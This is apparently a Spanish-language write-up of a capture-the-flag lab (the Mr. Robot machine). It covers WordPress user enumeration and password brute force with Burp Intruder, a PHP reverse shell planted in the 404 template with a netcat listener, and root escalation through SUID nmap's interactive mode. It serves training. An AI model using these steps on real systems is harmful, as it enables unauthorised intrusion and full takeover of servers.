**Contexto conceptual: file upload como vector de ataque**

Antes de entrar en la máquina, Carlos hace una explicación que vale la pena registrar porque estructura todo lo que viene después.

Cuando una web tiene un formulario de subida de ficheros, el servidor tiene tres posibles comportamientos:

- No tiene ninguna validación (lo más común, lo más peligroso)
 
- Tiene una **blacklist**: rechaza ciertas extensiones. Inútil en la práctica porque siempre hay formas de bypassearla
 
- Tiene una **whitelist**: solo acepta las extensiones que se listan explícitamente. Es la única aproximación correcta
 

Pero subir un fichero no es suficiente. Para que el ataque funcione hacen falta dos condiciones: que el fichero esté accesible desde el navegador y que el servidor lo interprete en vez de servirlo como texto. Un fichero PHP accesible a través de la URL y en un servidor Apache con PHP habilitado se ejecutará automáticamente al cargarlo, sin necesidad de permisos de ejecución explícitos en el sistema de ficheros.

La regla general: **Apache + Linux = PHP**. **IIS + Windows =** [**ASP.NET**](http://asp.net/). Subir una shell en el lenguaje equivocado produce un fichero inútil.

- **La metáfora útil:** subir un fichero malicioso sin que se ejecute es como colar una pistola en un edificio donde nadie sabe usarla. El peligro real llega cuando alguien la dispara, es decir, cuando el servidor interpreta el código

**Fuerza bruta con Burp Suite Intruder — enumeración de usuarios y contraseñas**

La máquina expone un WordPress en el puerto 80. El login de WordPress tiene una vulnerabilidad de information disclosure clásica: si el usuario no existe dice "Invalid username", pero si existe y la contraseña es incorrecta dice "The password you entered for the username X is incorrect". Esto permite enumerar usuarios válidos sin conocer ninguna contraseña.

El flujo con Burp Suite Intruder:

Con FoxyProxy activado se intercepta una petición de login fallida. Desde Proxy â†’ HTTP History se envía al Intruder. En Sniper Attack, se selecciona únicamente el parámetro del nombre de usuario como payload, dejando una contraseña arbitraria fija. En la configuración del payload se añaden manualmente nombres relacionados con la serie (Elliot, Tyrell, Darlene, Angela, etc.) más los clásicos (admin, administrator, root).

Al lanzar el ataque, se observa la longitud de la respuesta de cada petición. Todas las que producen "Invalid username" tienen la misma longitud. Cualquier desviación indica un comportamiento diferente del servidor, que en este caso corresponde al mensaje de "contraseña incorrecta", es decir, que el usuario existe. El usuario válido encontrado es elliot.

Con el usuario confirmado, se repite el proceso con el parámetro de contraseña como payload y el diccionario limpio de once mil líneas que se había preparado anteriormente con sort | uniq. La respuesta válida se distingue por una longitud diferente y por la presencia de una cookie de WordPress en el response, que indica que el login ha tenido éxito.

```
sort diccionario.txt | uniq > diccionario_clean.txt
```

- **La idea clave:** los mensajes de error de los formularios de login son información. Si el servidor distingue entre "usuario no existe" y "contraseña incorrecta", está confirmando la existencia de usuarios. Eso se llama information disclosure y permite convertir una fuerza bruta ciega en una fuerza bruta dirigida

**Reverse Shell desde la webshell**

La webshell permite ejecutar comandos, pero es incómoda para trabajo sostenido. El siguiente paso es obtener una reverse shell. Para ello, en el servidor de la víctima se actualiza la plantilla 404 con el contenido del fichero /usr/share/webshells/php/php-reverse-shell.php de Kali, modificando dos campos:

php

```php
$ip = 'NUESTRA_IP'; // La IP de la máquina atacante (ifconfig)
$port = 4444; // Puerto a la escucha
```

Antes de cargar la URL que ejecuta la reverse shell, se pone Netcat a la escucha:

```
nc -lvnp 4444
```

Al navegar a la URL del 404.php, la página se queda cargando (está ejecutando el PHP), y en el listener de Netcat llega la conexión. El usuario obtenido es daemon.

**Bind shell vs Reverse shell — la diferencia definitiva:** en una bind shell, el atacante se conecta a la víctima (el puerto está abierto en la víctima). En una reverse shell, la víctima se conecta al atacante (el puerto está abierto en el atacante). La reverse shell requiere RCE previo para ejecutar el código que inicia la conexión saliente.

```
su robot
```

**Escalada de privilegios: robot â†’ root mediante SUID en nmap**

Con el usuario robot, sudo -l no devuelve nada útil. La siguiente comprobación es buscar binarios con el bit SUID activado, que se ejecutan con los privilegios de su propietario independientemente de quién los lance:

```
find / -perm -u=s -type f 2>/dev/null
```

Entre los resultados aparece /usr/local/bin/nmap. Esto es inusual porque nmap no debería tener SUID. En la web GTFOBins ([gtfobins.github.io](http://gtfobins.github.io/)), buscando nmap con el filtro SUID, aparece que versiones antiguas de nmap (2.02 a 5.21) tienen un modo interactivo que permite ejecutar comandos arbitrarios:

```
nmap --interactive
# Dentro del modo interactivo de nmap:
!sh
```

El ! en nmap interactivo ejecuta comandos del sistema. Como nmap se está ejecutando con el bit SUID y su propietario es root, la shell que se spawna hereda los privilegios de root.

```
whoami
# root
```

La flag final está en /root/key-3-of-3.txt.

- **La idea clave:** el bit SUID en un binario significa que quien lo ejecute lo hará con los privilegios del propietario del fichero, no con los suyos propios. Si el propietario es root y ese binario tiene alguna funcionalidad que permite ejecutar comandos o abrir una shell (como nmap interactivo), cualquier usuario del sistema puede convertirse en root. GTFOBins documenta exactamente cómo hacerlo para decenas de binarios
